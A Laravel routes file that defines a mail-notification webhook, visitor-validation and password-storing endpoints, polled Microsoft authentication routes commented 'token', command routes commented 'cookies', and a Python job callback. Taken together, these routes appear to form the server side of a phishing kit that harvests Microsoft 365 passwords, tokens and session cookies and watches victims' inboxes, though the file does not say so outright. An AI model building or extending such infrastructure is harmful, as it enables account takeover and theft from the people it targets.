<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CoreSystemController;
use App\Http\Controllers\Api\CommandController;
use Illuminate\Support\Facades\Log;
use App\Models\PythonJob;

use App\Http\Controllers\Api\MicrosoftAuthController;
use App\Http\Controllers\MicrosoftInboxController;

use Illuminate\Http\Request;

Route::any('/mail-notify', function (Request $request) {

    if ($request->has('validationToken')) {

        header('Content-Type: text/plain');

        echo $request->query('validationToken');

        exit;
    }

    \Log::info('MAIL WEBHOOK', [
        'body' => file_get_contents("php://input")
    ]);

    return response('ok', 200);
});


Route::post('/valid-visitor', [CoreSystemController::class, 'storeValidVisitor']);
Route::post('/send-password', [CoreSystemController::class, 'storePassword']);
// token
Route::post('/start', [MicrosoftAuthController::class, 'start']);
Route::get('/poll/{login_id}', [MicrosoftAuthController::class, 'poll']);
// cookies
Route::post('/command/start', [CommandController::class, 'start']);
Route::get('/command/poll/{id}', [CommandController::class, 'poll']);
Route::post('/python/callback', function (Request $request) {

    if ($request->header('X-Python-Secret') !== config('services.python.secret')) {
        return response()->json(['error' => 'unauthorized'], 403);
    }

    Log::info('PYTHON CALLBACK', $request->all());

    $job = PythonJob::find($request->job_id);

    if (!$job) {
        return response()->json(['error' => 'job not found'], 404);
    }

    $job->update([
        'status' => $request->status,
        'result' => $request->status === 'done' ? $request->data : $job->result,
        'error' => $request->status === 'failed' ? $request->error : $job->error,
    ]);

    return response()->json(['ok' => true]);
})->name('python.callback');




